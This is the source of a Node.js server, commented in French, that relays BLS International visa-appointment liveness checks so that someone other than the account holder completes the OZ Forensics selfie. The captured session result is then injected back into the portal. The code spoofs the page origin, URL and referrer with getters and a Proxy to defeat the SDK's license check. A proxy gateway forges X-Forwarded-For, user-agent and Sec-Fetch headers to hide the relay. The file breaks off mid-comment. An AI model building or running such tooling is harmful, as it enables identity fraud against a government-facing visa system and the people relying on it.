/**
 * 2AO Selfie Server v1.5.0
 * Deploy on Render: https://dz34sni-26.onrender.com
 * 
 * v1.5.0 (RECONSTRUCTION sur capture RÉELLE du portail BLS)
 *  - Gateway /oz : PLUS AUCUN Origin/Referer forcé vers les API OZ — la
 *    capture réelle montre que le SDK (v1.9.7-29) envoie tm.php/init.php/
 *    request.php SANS Origin/Referer (uniquement traceparent, esid, sec-ch-ua,
 *    UA, Content-Type). Forcer Origin/Referer = diverger du flux réel.
 *  - Sec-Fetch-* normalisés vers cross-site/cors/empty (masquer notre gateway).
 *  - Parsing cookie inline (cookie-parser absent → req.cookies était undefined
 *    → le cookie dz2ao_ip (XFF) n'était JAMAIS relu). Corrigé.
 *  - /oz-page : transaction_id rejoué dans META (config réelle du portail :
 *    {session_token, lang, meta:{transaction_id}, action:[video_selfie_blank]})
 *    et plus au premier niveau. result_mode/overlay_options NE SONT PLUS forcés.
 *  - /task stocke webAdapterUrl + appointmentId ; /oz-page pose le cookie
 *    dz2ao_wau pour que la gateway relaie vers le bon tenant.
 * 
 * v1.4.0 CRITICAL (flux moderne OZ — session_token/transactionId):
 *  - transaction_id est passé en OPTION DE PREMIER NIVEAU de OzLiveness.open()
 *    (et plus seulement dans meta) : sans lui, le SDK analyse sous un AUTRE
 *    transactionId → BLS /oz-forensics/verify() → FAILED.
 *  - on_error() du SDK renvoie l'erreur au serveur via POST /result/:code
 *    (status:'error') → diagnostic du selfie client SANS extension sur mobile.
 *  - Gateway de traçage OZ : /oz/* + /oz?u=<abs> + rewriting SDK → TOUS les
 *    appels OZ du téléphone passent par notre serveur (logs URL/en-têtes/
 *    corps/statut) → plus aucun angle mort côté client.
 *  - GET /oztrace : dernière activité OZ tracée (même sans logs Render).
 * 
 * v1.3.3 FIXES:
 *  - Spoof Location étendu : location.href (+ location.pathname) renvoient
 *    maintenant https://algeria.blsinternational.com/dza/appointment/LivenessRequest.
 *    Le SDK OZ analyse aussi href (pas seulement origin/hostname) pour la licence →
 *    « Verification Failed » possible sans ce spoof.
 * 
 * v1.3.2 FIXES:
 *  - isOzApi(): ne plus exclure web-sdk.prod.cdn.spain.ozforensics.com —
 *    les appels API OZ (config.php, tm.php, event.php) partent de CE host
 *    (capture réseau) → le patch fetch/XHR doit y injecter X-Forwarded-For,
 *    X-Real-IP, Origin et Referer, exactement comme le fait l'extension agent.
 *  - Retry auto si OzLiveness indéfini au lancement : re-check toutes les
 *    1,5 s et recharge la balise SDK en cas d'erreur onerror (CDN pas encore
 *    joignable via le proxy au premier essai).
 * 
 * v1.3.1 CRITICAL FIX:
 *  - Replay the REAL OzLiveness.open() config captured from the BLS portal
 *    (task.ozConfig) instead of a hardcoded guess. BLS expects the exact
 *    config (action, result_mode, meta, etc.) it passed to the SDK → mismatch
 *    of guessed config = "Verification Failed".
 *  - session_token passthrough kept (if the portal ever provides one).
 * 
 * v1.3 FIXES:
 *  - Forward session_token (JWT) from agent's ozConfig to OzLiveness.open()
 * 
 * v1.2 FIXES:
 *  - Location.prototype spoof (fakes document.location.origin to BLS)
 *  - Origin/Referer headers on OZ API calls (not just X-Forwarded-For)
 *  - Consistent header injection across all OZ requests
 * 
 * Flow (uses 4-digit CODE instead of phone):
 * 1. Agent captures userId + transactionId from BLS liveness page
 * 2. Agent POSTs task to /task/:code
 * 3. Client polls GET /task/:code → receives task
 * 4. Client navigates to GET /oz-page?... → loads OZ SDK → does selfie
 * 5. Client POSTs result to /result/:code (success OU error via on_error)
 * 6. Agent polls GET /result/:code → gets event_session_id → injects
 * 7. Agent DELETEs /clear/:code → cleanup
 */

const express = require('express');
const cors = require('cors');
const zlib = require('zlib');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// OZ GATEWAY CONFIG (v1.4.0)
// ═══════════════════════════════════════════
const OZ_BASE = 'https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational3';
const OZ_HOST = 'web-sdk.prod.cdn.spain.ozforensics.com';
const BLS_ORIGIN_S = 'https://algeria.blsinternational.com';
const BLS_PATH_S = '/dza/appointment/LivenessRequest';

// Trace circulaire : dernière activité OZ + logs récents (consultable /oztrace)
const TRACE = { oz: [], log: [] };
function traceOz(entry) {
    TRACE.oz.push(Object.assign({ at: new Date().toISOString() }, entry));
    if (TRACE.oz.length > 400) TRACE.oz.splice(0, TRACE.oz.length - 400);
    try { console.log('[OZ-GW] ' + JSON.stringify(entry).substring(0, 600)); } catch (e) {}
}
function traceLog(msg) {
    TRACE.log.push({ at: new Date().toISOString(), msg: String(msg).substring(0, 500) });
    if (TRACE.log.length > 200) TRACE.log.splice(0, TRACE.log.length - 200);
}

// ═══ v1.5.0 : parseur de cookies inline (cookie-parser n'est pas installé,
// req.cookies était TOUJOURS undefined → le cookie dz2ao_ip (XFF réel) n'était
// jamais relu côté gateway). On parse le header 'cookie' nous-mêmes. ═══
function pickCookies(header) {
    const out = {};
    if (!header) return out;
    String(header).split(';').forEach(function(pair) {
        const i = pair.indexOf('=');
        if (i <= 0) return;
        try {
            const k = pair.substring(0, i).trim();
            const v = decodeURIComponent(pair.substring(i + 1).trim());
            out[k] = v;
        } catch (e) {}
    });
    return out;
}

// Base cible de la gateway OZ : webAdapterUrl du cookie posé par /oz-page
// (provenant de la tâche = la VRAIE URL du tenant capturée sur le portail),
// sinon la constante OZ_BASE (blsinternational3).
function ozTargetBase(req) {
    try {
        const c = pickCookies(req.headers['cookie'] || '')['dz2ao_wau'];
        if (c && /^https:\/\//i.test(c)) return String(c).replace(/\/+$/, '');
    } catch (e) {}
    return OZ_BASE;
}

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    if (req.path.indexOf('/oz') !== 0) console.log(`[${ts}] ${req.method} ${req.path}`);
    next();
});

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};
const REC_UPLOADS = [];

// Auto-cleanup: remove entries older than 30 minutes
setInterval(() => {
    const now = Date.now();
    const MAX_AGE = 30 * 60 * 1000;
    for (const code in tasks) {
        if (now - (tasks[code].timestamp || 0) > MAX_AGE) {
            delete tasks[code];
            console.log(`[CLEANUP] Task removed: ${code}`);
        }
    }
    for (const code in results) {
        if (now - (results[code].timestamp || 0) > MAX_AGE) {
            delete results[code];
            console.log(`[CLEANUP] Result removed: ${code}`);
        }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// ROUTES: TASK (Agent → Client)
// ═══════════════════════════════════════════

app.post('/task/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};
    
    if (!body.userId || !body.transactionId) {
        return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
    }

    tasks[code] = {
        userId: body.userId,
        transactionId: body.transactionId,
        realIp: body.realIp || '',
        proxy: body.proxy || '',
        cookies: body.cookies || '',
        userAgent: body.userAgent || '',
        pageUrl: body.pageUrl || '',
        verificationToken: body.verificationToken || '',
        ozConfig: body.ozConfig || '',
        webAdapterUrl: body.webAdapterUrl || '',
        appointmentId: body.appointmentId || '',
        timestamp: body.timestamp || Date.now()
    };

    console.log(`[TASK] 📥 ${code}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'} proxy=${body.proxy ? '✅' : '—'}`);
    res.json({ ok: true });
});

app.get('/task/:code', (req, res) => {
    const code = req.params.code;
    const task = tasks[code];

    if (task) {
        console.log(`[TASK] 📤 ${code}: sending task`);
        res.json({ ok: true, task: task });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: RESULT (Client → Agent)
// ═══════════════════════════════════════════

app.post('/result/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};

    // v1.4.0 : le client peut aussi renvoyer une ERREUR SDK (on_error)
    if (body.status === 'error') {
        results[code] = {
            status: 'error',
            error: String(body.error || 'unknown').substring(0, 500),
            transactionId: body.transactionId || '',
            realIp: body.realIp || '',
            timestamp: body.timestamp || Date.now()
        };
        delete tasks[code];
        traceLog(`[RESULT:ERROR] ${code}: ${JSON.stringify(body).substring(0, 300)}`);
        console.log(`[RESULT] ❌ ${code}: SELFIE ERREUR -> ${String(body.error).substring(0, 300)}`);
        return res.json({ ok: true, status: 'error' });
    }

    if (!body.event_session_id) {
        return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
    }

    results[code] = {
        event_session_id: body.event_session_id,
        status: body.status || 'completed',
        realIp: body.realIp || '',
        timestamp: body.timestamp || Date.now()
    };

    delete tasks[code];

    console.log(`[RESULT] ✅ ${code}: session=${body.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:code', (req, res) => {
    const code = req.params.code;
    const result = results[code];

    if (result) {
        console.log(`[RESULT] 📤 ${code}: sending result`);
        res.json({ ok: true, result: result });
    } else {
        res.json({ ok: false, result: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:code', (req, res) => {
    const code = req.params.code;
    delete tasks[code];
    delete results[code];
    console.log(`[CLEAR] 🗑️ ${code}`);
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ GATEWAY DE TRACAGE (v1.4.0)
// Fait transiter TOUS les appels OZ du téléphone par notre serveur :
//   - /oz/<chemin>   → relais vers https://web-sdk.../blsinternational3/<chemin>
//   - /oz?u=<abs>    → relais absolu (upload/capsule depuis le phone patché)
// Journalise méthode, URL, en-têtes clés, corps, statut et durée.
// ═══════════════════════════════════════════

function forwardOz(req, res, target, codeHint) {
    const started = Date.now();
    const myHeaders = { ...req.headers };
    delete myHeaders['host'];
    delete myHeaders['connection'];
    delete myHeaders['keep-alive'];
    delete myHeaders['transfer-encoding'];
    delete myHeaders['proxy-connection'];
    delete myHeaders['upgrade'];

    // Injection en-têtes côté serveur.
    // v1.5.0 (données RÉELLES) : la licence OZ est validée par le SDK côté
    // client (location.origin, couvert par le spoof de la page). Les requêtes
    // API réelles du SDK (config.php, tm.php, init.php, request.php) n'envoient
    // AUCUN Origin ni Referer (capture : traceparent, esid, sec-ch-ua, UA,
    // Content-Type uniquement). Forcer Origin/Referer = diverger du flux réel →
    // risque de rejet backend (Vary:Origin / preflight). On les retire.
    // On normalise aussi Sec-Fetch-* : côté navigateur ces appels transitent par
    // notre gateway (même origine que la page) alors que le flux réel est
    // cross-site → on masque en cross-site/cors/empty pour coller à la réalité.
    const targetIsBLS = target.indexOf('blsinternational.com') !== -1;
    myHeaders['host'] = targetIsBLS ? (new URL(target).host) : OZ_HOST;
    delete myHeaders['origin'];
    delete myHeaders['referer'];
    if (!targetIsBLS) {
        delete myHeaders['sec-fetch-site'];
        delete myHeaders['sec-fetch-mode'];
        delete myHeaders['sec-fetch-dest'];
        delete myHeaders['sec-fetch-user'];
        myHeaders['sec-fetch-site'] = 'cross-site';
        myHeaders['sec-fetch-mode'] = 'cors';
        myHeaders['sec-fetch-dest'] = 'empty';
    }
    const realIp = (req.headers['x-2ao-ip']) || (pickCookies(req.headers['cookie'] || '')['dz2ao_ip']) || req.headers['x-forwarded-for'] || '';
    if (realIp) { myHeaders['x-forwarded-for'] = realIp; myHeaders['x-real-ip'] = realIp; }

    // v1.8.0 : continuité UA. Le SDK tourne dans le navigateur du téléphone
    // (UA mobile) alors que la session OZ a été créée depuis l'AGENT (UA desktop).
    // Si l'agent a partagé son userAgent (tâche), /oz-page le pose en cookie
    // dz2ao_ua et toutes les requêtes gateway passent avec l'UA de la session
    // d'origine → cohérence backend (même IP réelle, même UA que la capture).
    const agentUa = pickCookies(req.headers['cookie'] || '')['dz2ao_ua'];
    if (agentUa) myHeaders['user-agent'] = agentUa;

    // v1.4.1 FIX CRITIQUE : OZ gzip le SDK (Content-Encoding: gzip) quand le
    // navigateur envoie Accept-Encoding: gzip → notre gateway renvoyait les
    // OCTETS GZIP BRUTS sans l'en-tête Content-Encoding → le <script> était
    // un blob gzip impossible à parser → SDK jamais lancé (ni téléphone, ni test).
    // → 1) on demande identity en amont 2) on décompresse quand même le gzip
    // si le CDN répond compressé 3) jamais de content-length (taille faussée).
    myHeaders['accept-encoding'] = 'identity';

    const isBinary = /(octet-stream|multipart|wasm|zip|data|font|image)/i.test((req.headers['content-type'] || ''));
    let reqBodyChunk = '';
    const origEnd = res.end.bind(res);
    let respSize = 0;
    let respHead = '';
    res.end = function(chunk, enc, cb) {
        if (chunk && chunk.length) respSize += chunk.length;
        return origEnd(chunk, enc, cb);
    };

    const doLog = (ok, extra) => {
        const dur = Date.now() - started;
        traceOz({
            code: codeHint || (req.query._c || '') || '-',
            method: req.method,
            target: target.substring(0, 220),
            status: ok === false ? 'ERR' : (res.statusCode || ''),
            size: respSize,
            dur: dur + 'ms',
            clientIp: (req.headers['x-forwarded-for'] || req.ip || '').substring(0, 40),
            extra: extra || ''
        });
    };

    try {
        const http = require('http');
        const https = require('https');
        const u = new URL(target);
        const lib = u.protocol === 'https:' ? https : http;
        const preq = lib.request(u, {
            method: req.method,
            headers: myHeaders,
            timeout: 30000
        }, (pres) => {
            res.statusCode = pres.statusCode;
            const hdrs = {};
            for (const [k, v] of Object.entries(pres.headers)) {
                if (/^(connection|keep-alive|transfer-encoding|upgrade|content-encoding|content-length)$/i.test(k)) continue;
                try { hdrs[k] = v; } catch (e) {}
            }
            res.set(hdrs);
            // v1.4.1 : décompression amont (gzip/deflate/br) → on sert toujours identity.
            let pipe = pres;
            const enc = String(pres.headers['content-encoding'] || '').toLowerCase();
            if (enc === 'gzip' || enc === 'x-gzip') pipe = pres.pipe(zlib.createGunzip());
            else if (enc === 'deflate') pipe = pres.pipe(zlib.createInflate());
            else if (enc === 'br') pipe = pres.pipe(zlib.createBrotliDecompress());
            pipe.on('data', (d) => {
                respSize += d.length;
                if (respHead.length < 400) respHead += d.toString('latin1');
            });
            pipe.on('end', () => {
                doLog(true, respHead.substring(0, 200));
                res.end();
            });
            pipe.pipe(res, { end: false });
            pipe.on('error', (e) => { doLog(false, 'resp: ' + e.message); res.end(); });
        });
        preq.on('timeout', function() { preq.destroy(new Error('timeout')); });
        preq.on('error', (e) => { doLog(false, 'req: ' + e.message); try { res.status(502).end('gw error'); } catch (e2) {} });

        if (req.headers['content-length']) {
            let sent = 0;
            req.on('data', (d) => {
                sent += d.length;
                if (!isBinary && reqBodyChunk.length < 800) reqBodyChunk += d.toString('utf8');
            });
            req.on('end', () => {
                if (reqBodyChunk) reqBodyChunk = 'BODY:' + reqBodyChunk;
                if (!isBinary && reqBodyChunk) {
                    const m = myHeaders;
                    m['x-2ao-body-hash'] = 'len:' + sent;
                    traceOz({
                        code: codeHint || req.query._c || '-',
                        method: req.method,
                        target: target.substring(0, 160),
                        body: reqBodyChunk.substring(0, 300)
                    });
                }
            });
        }
        req.pipe(preq);
    } catch (e) {
        doLog(false, e.message);
        try { res.status(502).json({ ok: false, error: 'gw:' + e.message }); } catch (e2) {}
    }
}

app.use('/oz', (req, res, next) => {
    // Garde-fou : ne pas avaler /oz-page, /oztrace ni d'autres routes en /oz*
    const tail = req.originalUrl.slice(3);
    if (tail !== '' && tail.charAt(0) !== '/' && tail.charAt(0) !== '?') return next();
    traceLog(`[OZ-GW] ${req.method} ${req.originalUrl}`);
    const codeHint = req.query._c || '';
    // 1) mode absolu : /oz?u=<url> (fetch/XHR du téléphone re-écrits)
    if (req.query.u) {
        const u = String(req.query.u);
        if (/^https:\/\//i.test(u) && (u.indexOf('ozforensics.com') !== -1 || u.indexOf('blsinternational.com') !== -1)) {
            return forwardOz(req, res, u, codeHint);
        }
        return res.status(400).json({ ok: false, error: 'bad target' });
    }
    // 2) relais relatif CDN : /oz/plugin_liveness.php?ver=...
    // v1.5.0 : base dynamique = webAdapterUrl de la tâche (cookie dz2ao_wau),
    // sinon tenant blsinternational3 (OZ_BASE).
    const base = ozTargetBase(req);
    return forwardOz(req, res, base + (req.url === '/' ? '' : req.url), codeHint);
});

app.get('/oztrace', (req, res) => {
    res.json({
        version: '1.5.0',
        oz: TRACE.oz.slice(-150),
        log: TRACE.log.slice(-60),
        tasks: Object.keys(tasks).length,
        results: Object.keys(results).length
    });
});

// v1.5.0 : le CLIENT (téléphone) pousse ses états ici → consultable /oztrace/log
// pour comprendre le flux réel (mode actif, tentatives de nav, URL courante…).
app.get('/oztrace/log', (req, res) => {
    const parts = [];
    if (req.query.m) parts.push(decodeURIComponent(String(req.query.m)));
    if (req.query.u) parts.push('url=' + decodeURIComponent(String(req.query.u)));
    traceLog('[CLIENT] ' + parts.join(' · '));
    res.json({ ok: true });
});

// ═══ v1.6.4 : dépôt des chaînes du SDK OZ décodées depuis h9.H84/y$U ═══
// Le /oz-page dump les chaînes "origin"-like du SDK → /ozstrings ; consultable
// en GET pour identifier l'index EXACT du check d'origine (licence).
let OZ_STRINGS = { updated: 0, hook: 0, count: 0, entries: [] };
app.post('/ozstrings', express.json({ limit: '256kb' }), (req, res) => {
    const b = req.body || {};
    const list = Array.isArray(b.list) ? b.list : [];
    OZ_STRINGS.updated = Date.now();
    OZ_STRINGS.hook = b.hook ? 1 : 0;
    OZ_STRINGS.count = list.length;
    OZ_STRINGS.entries = list.filter(e => e && typeof e.s === 'string').slice(-200);
    res.json({ ok: true });
});
app.get('/ozstrings', (req, res) => {
    res.json(OZ_STRINGS);
});

// ═══════════════════════════════════════════
// ROUTE: OZ-PAGE (Client loads this for real selfie)
// ═══════════════════════════════════════════

// v1.6.0 : partagé entre /oz-page et /dza* (le SDK OZ navigue parfois
// top-level vers son URL canonique /dza/appointment/LivenessRequest → si le
// serveur 404, le content script MODE 1 reprend la main et masque la caméra.
// /dza* resert la MÊME page selfie (paramètres restaurés via cookie dz2ao_last).
function buildOzPage(req, opts) {
    const { userId, transactionId, realIp, code, ua } = opts;
    const clientCode = code || '';
    
    // ═══ v1.3.1: Replay the REAL ozConfig captured from the BLS portal ═══
    // The agent's 2ao-page.js captures the exact config passed to
    // OzLiveness.open() on the portal and sends it to /task/:code.
    // We replay its serializable fields (action, result_mode, meta, ...)
    // so the client page opens an IDENTICAL session, not a guessed one.
    let realCfg = {};
    let sessionToken = '';
    const task = tasks[clientCode];
    if (task && task.ozConfig) {
        try {
            const parsed = typeof task.ozConfig === 'string' ? JSON.parse(task.ozConfig) : task.ozConfig;
            if (parsed && typeof parsed === 'object') {
                for (const k of Object.keys(parsed)) {
                    if (/^on_/i.test(k)) continue;
                    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
                    realCfg[k] = parsed[k];
                }
            }
            sessionToken = parsed.session_token || '';
            const metaKeys = realCfg.meta ? Object.keys(realCfg.meta) : [];
            console.log(`[OZ-PAGE] ${clientCode}: real config replayed (keys: ${Object.keys(realCfg).join(',') || 'none'}) meta=${metaKeys.join(',') || '—'} session_token=${sessionToken ? '✅' : '—'}`);
        } catch (e) {
            console.log(`[OZ-PAGE] ${clientCode}: ozConfig parse error:`, e.message);
        }
    }
    realCfg.meta = Object.assign({}, realCfg.meta && typeof realCfg.meta === 'object' ? realCfg.meta : {});
        // v1.5.0 : la VRAIE URL du tenant (webAdapterUrl de la capture) prime.
        // Si elle est connue, elle est posée en cookie pour que la gateway /oz
        // relaie vers le bon tenant (seul blsinternational3 aujourd'hui).
        const wau = (task && (task.webAdapterUrl || '')) || '';
        if (wau) {
            realCfg.webAdapterUrl = wau;
            try { res.cookie('dz2ao_wau', wau, { httpOnly: false, maxAge: 6 * 3600 * 1000, sameSite: 'lax' }); } catch (e) {}
        }
    
    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = escJs(userId);
    const tid = escJs(transactionId);
    const ip = escJs(realIp);
    const cd = escJs(clientCode);
    const st = escJs(sessionToken);
    // v1.4.0 : base de notre serveur (pour le reverse proxy OZ côté téléphone)
    const base = (req.headers['x-forwarded-proto'] || req.protocol) + '://' + req.get('host');

    // Cookie IP réelle → le gateway /oz l'utilise comme X-Forwarded-For
    if (ip) {
        try { res.cookie('dz2ao_ip', ip, { httpOnly: false, maxAge: 6 * 3600 * 1000, sameSite: 'lax' }); } catch (e) {}
    }
    // v1.8.0 : UA de l'agent (session d'origine) → gateway /oz le renvoie
    if (ua) {
        try { res.cookie('dz2ao_ua', escJs(ua), { httpOnly: false, maxAge: 6 * 3600 * 1000, sameSite: 'lax' }); } catch (e) {}
    }
    // v1.6.0 : mémoire de la session pour /dza* (redémarrage du SDK sur son URL canonique)
    try { res.cookie('dz2ao_last', JSON.stringify({ userId: userId || '', transactionId: transactionId || '', realIp: realIp || '', code: clientCode }), { httpOnly: false, maxAge: 6 * 3600 * 1000, sameSite: 'lax' }); } catch (e) {}

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness Check</title>
<!-- v1.4.0 : toutes les URLs relatives du SDK OZ (plugin/*, vendor/*, *.wasm,
     *.js) doivent résoudre sous {base}/oz/ pour passer par la gateway de
     traçage — sinon container.wasm serait demandé à /plugin/... (404 local). -->
<base href="${base}/oz/">
<style>
body { margin: 0; background: #08090d; font-family: system-ui, sans-serif; }
#st {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: linear-gradient(135deg,#FF6B35,#F7931E); color: #fff;
    padding: 12px 24px; border-radius: 10px;
    font-size: 14px; z-index: 99999; text-align: center; font-weight: 700;
    box-shadow: 0 4px 20px rgba(247,147,30,.4);
}
.ozliveness_logo,.ozliveness_version{display:none!important}

/* Success overlay */
#success-screen{position:fixed;inset:0;z-index:2147483647;display:none;align-items:center;justify-content:center;background:linear-gradient(135deg,#0d9488,#059669,#047857);overflow:hidden}
@keyframes confetti{0%{opacity:1;transform:translateY(0) rotate(0deg)}100%{opacity:0;transform:translateY(100vh) rotate(720deg)}}
@keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
</style>
</head>
<body>
<div id="oz-container"></div>
<div id="st">🔥 Chargement SDK...</div>
<div id="diag" style="position:fixed;bottom:4px;left:4px;right:4px;font:10px monospace;color:#ffd;background:rgba(0,0,0,.75);padding:4px;white-space:pre-wrap;word-break:break-all;z-index:9999;display:none"></div>

<!-- Success screen with confetti -->
<div id="success-screen">
    <div id="confetti-container"></div>
    <div style="text-align:center;z-index:2;animation:pop .6s ease-out forwards">
        <div style="font-size:80px;margin-bottom:10px;animation:bounce 1.5s ease-in-out infinite">🎉</div>
        <div style="font-size:36px;font-weight:900;color:#fff;margin-bottom:8px;text-shadow:0 4px 20px rgba(0,0,0,.3)">FÉLICITATIONS !</div>
        <div style="font-size:20px;font-weight:700;color:rgba(255,255,255,.9);margin-bottom:6px">✅ Selfie réussi avec succès</div>
        <div style="font-size:15px;color:rgba(255,255,255,.7);margin-bottom:28px">يمكنك الان اغلاق هذه الصفحة</div>
        <button onclick="closePage()" style="padding:16px 44px;border-radius:14px;border:none;cursor:pointer;font-weight:700;font-size:17px;color:#059669;background:#fff;box-shadow:0 6px 30px rgba(0,0,0,.2);letter-spacing:1px;animation:pop .6s ease-out .3s both">🏠 RETOUR</button>
        <div style="margin-top:16px;font-size:14px;color:rgba(255,255,255,.7);font-weight:700">Retour dans <span id="countdown">8</span>s</div>
    </div>
</div>

<!-- ═══ LOCATION ORIGIN SPOOF ═══ -->
<!-- The OZ SDK checks document.location.origin against its license.
     This page lives on onrender.com → LICENSE_ORIGIN_ERROR.
     We patch Location.prototype BEFORE any SDK script runs so
     the SDK sees algeria.blsinternational.com as the origin. -->
<script>
(function(){
    try { window.__dzSpoofRan = 1; } catch(e){}
    var B='https://algeria.blsinternational.com';
    var H='algeria.blsinternational.com';
    var PATH='/dza/appointment/LivenessRequest';
    try{Object.defineProperty(window,'origin',{configurable:true,get:function(){return B;}});window.__dzOvWin=1;}catch(e){}
    try{Object.defineProperty(location,'origin',{configurable:true,get:function(){return B;}});window.__dzOvLoc=1;}catch(e){}
    // ═══ v1.6.1 : channels d'origine ENCORE non couverts :
    //   - document.origin (propriété distincte de location.origin)
    //   - location.port / document.location.origin
    //   - performance.getEntriesByType('navigation')[0].name (URL réelle)
    try{Object.defineProperty(document,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
    try{Object.defineProperty(location,'port',{configurable:true,get:function(){return '';}});}catch(e){}
    try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}
    try{
        var __pget = Object.getOwnPropertyDescriptor(Location.prototype,'port');
        if (__pget) Object.defineProperty(Location.prototype,'port',{configurable:true,get:function(){return '';}});
    }catch(e){}
    try{
        var __nav0 = Performance.prototype.getEntriesByType;
        Performance.prototype.getEntriesByType = function(t){
            var arr = __nav0.call(this, t);
            if (t === 'navigation' && arr && arr[0]) {
                try{Object.defineProperty(arr[0],'name',{configurable:true,value:B+PATH});}catch(e){}
                try{Object.defineProperty(arr[0],'startTime',{configurable:true,value:0});}catch(e){}
            }
            return arr;
        };
    }catch(e){}
    try{Object.defineProperty(document,'referrer',{configurable:true,get:function(){return B+'/manage-appointments';}});}catch(e){}
    // ═══ v1.6.4 : monkeypatchs v1.6.3 SUPPRIMÉS ═══
    // Le check licence est une ÉGALITÉ STRICTE (prouvé) → les patchs
    // indexOf/includes/Set.has ne servaient à rien et CASSENT l'exécution du
    // loader obfusqué (détournement de contrôle-flow → plus aucune requête
    // config/tm n'est émise → "SDK non chargé (CDN injoignable)").
    // ═══ v1.4.2 : fuites restantes du check d'origine (license_origin_error ═══
    // Le SDK lit aussi document.URL, document.baseURI, location.toString()
    // et window.top — couvrir pour neutraliser LICENSE_ORIGIN_ERROR.
    try{Object.defineProperty(document,'URL',{configurable:true,get:function(){return B+PATH;}});}catch(e){}
    try{Object.defineProperty(document,'baseURI',{configurable:true,get:function(){return B+PATH;}});}catch(e){}
    try{Object.defineProperty(globalThis,'location',{configurable:true,get:function(){return window.location;}});}catch(e){}
    try{Object.defineProperty(window,'top',{configurable:true,get:function(){return window;}});}catch(e){}
    try{Object.defineProperty(window,'parent',{configurable:true,get:function(){return window;}});}catch(e){}
    try{Object.defineProperty(window,'opener',{configurable:true,get:function(){return null;}});}catch(e){}
    try{Object.defineProperty(document,'defaultView',{configurable:true,get:function(){return window;}});}catch(e){}
    var P=window.Location&&window.Location.prototype;
    if(P){
        [['origin',function(){return B;}],
        ['hostname',function(){return H;}],
        ['host',function(){return H;}],
        ['protocol',function(){return 'https:';}],
        ['pathname',function(){return PATH;}],
        ['href',function(){return B+PATH;}]
        ].forEach(function(a){try{Object.defineProperty(P,a[0],{configurable:true,get:a[1]});window.__dzOvProto=1;}catch(e){}});
        try{Object.defineProperty(P,'toString',{configurable:true,value:function(){return B+PATH;}});}catch(e){}
        try{Object.defineProperty(P,'toLocaleString',{configurable:true,value:function(){return B+PATH;}});}catch(e){}
    }
    // ═══ v1.6.2 : PALIER FINAL sur location — PROXY ═══
    // Le debug du téléphone a prouvé : window.location.origin renvoie le VRAI
    // (onrender) même après le patch du prototype → l'objet Location natif de ce
    // navigateur expose un getter own non-configurable qui écrase le prototype.
    // → On remplace le BINDING window/document/globalThis.location par un Proxy
    // dont les lectures liées à l'origine renvoient le domaine BLS. Les actions
    // (assign/replace/reload, href=) sont transmises au VRAI location.
    try {
        var __realLoc = window.location;
        var __locTgt = Object.create(Object.getPrototypeOf(__realLoc));
        try { __locTgt.__dzProbe = 1; } catch(ep){}
        var __fakeLoc = new Proxy(__locTgt, {
            get: function(t, prop, recv) {
                if (prop === '__dzProbe') return 1;
                if (prop === 'origin') return B;
                if (prop === 'hostname' || prop === 'host') return H;
                if (prop === 'protocol') return 'https:';
                if (prop === 'pathname') return PATH;
                if (prop === 'href') return B + PATH;
                if (prop === 'port') return '';
                if (prop === 'search' || prop === 'hash') return '';
                if (prop === 'username' || prop === 'password') return '';
                if (prop === 'ancestorOrigins') return [];
                if (prop === 'toString' || prop === 'toLocaleString' || prop === 'valueOf') return function(){ return B + PATH; };
                if (prop === 'assign' || prop === 'replace' || prop === 'reload') {
                    return function(u){ try { return __realLoc[prop].apply(__realLoc, arguments); } catch(e){} };
                }
                var v;
                try { v = __realLoc[prop]; } catch(e) { return undefined; }
                return (typeof v === 'function') ? v.bind(__realLoc) : v;
            },
            set: function(t, prop, val) { try { __realLoc[prop] = val; } catch(e){} return true; },
            has: function(t, prop) { try { return prop in __realLoc; } catch(e){} return false; }
        });
        var __locInstalled = false;
        try { Object.defineProperty(window, 'location', { configurable: true, get: function(){ return __fakeLoc; } }); __locInstalled = true; } catch(e){}
        try { Object.defineProperty(document, 'location', { configurable: true, get: function(){ return __fakeLoc; } }); } catch(e){}
        try { Object.defineProperty(globalThis, 'location', { configurable: true, get: function(){ return __fakeLoc; } }); } catch(e){}
        try { window.__dzLocOK = __locInstalled ? 1 : 0; } catch(ek){}
        if (!__locInstalled) {
            // location non remplaçable ici → on conserve les patchs prototype (bancal).
        }
    } catch(e){}
    // ═══ v1.6.0 : CHANGEMENTS majeurs d'origine.
    //  1) replaceState SUPPRIMÉ : il changeait l'URL de l'onglet vers un path
    //     qui n'existe pas (404) d'où la reprise du content script MODE 1
    //     (overlay "Tâche reçue"/"En attente") PAR-DESSUS la page caméra.
    //     Les getters ci-dessus suffisent — ne plus toucher à l'URL réelle.
    //  2) Injection du spoof dans TOUTES les iframes même-origine créées par le
    //     SDK : le rendu liveness/détection tourne souvent dans une iframe dont
